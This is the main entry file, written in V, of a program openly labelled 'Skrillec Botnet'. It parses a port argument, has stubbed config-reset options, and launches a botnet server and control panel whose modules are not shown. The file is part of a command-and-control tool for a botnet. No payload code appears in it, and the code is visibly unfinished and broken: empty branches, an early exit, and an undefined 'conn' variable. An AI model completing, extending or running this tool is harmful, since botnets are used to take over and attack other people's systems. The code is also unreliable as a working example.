/*
	[ ~ Skrillec Botnet ~ ]

	Developers:
		- Occupied
		- Awful
		- Exo
		- satis

	Since: 
		11/17/21

*/


// Importing Modules
import os
import net

//Importing SubModules
import server
import config
import skrillec_cp

fn main() {
	mut svr := server.Server{clients: &server.Clients{}}
	
	// Command Parsing 
	mut cmd_args := os.args.clone()
	for i, v in cmd_args {
		// if v == ""
		if v == "-p" { svr.set_port(cmd_args[i+1]) }

		if v == "-reset_config" {
			if cmd_args[i+1] == "MySQL" {
				//reset mysql info
			} else if cmd_args[i+1] == "localdb" {
				//reset local db files
			} else if cmd_args[i+1] == "net_info" {
				// reset net_info 
			} else if cmd_args[i+1] == "-y" {
				// Execute function that'd reset the whole config file to default
			}
		}

		// if v == ""
	}
	if svr.port.len == 0 {
		print("[x] Warning. No port was provided. Looking through config file for port.........!\r\n")
		exit(0)
		// Execute function to look for PORT in config file
	}
	go server.start_skrillec(mut &svr)
	skrillec_cp.main_cp(mut conn)
}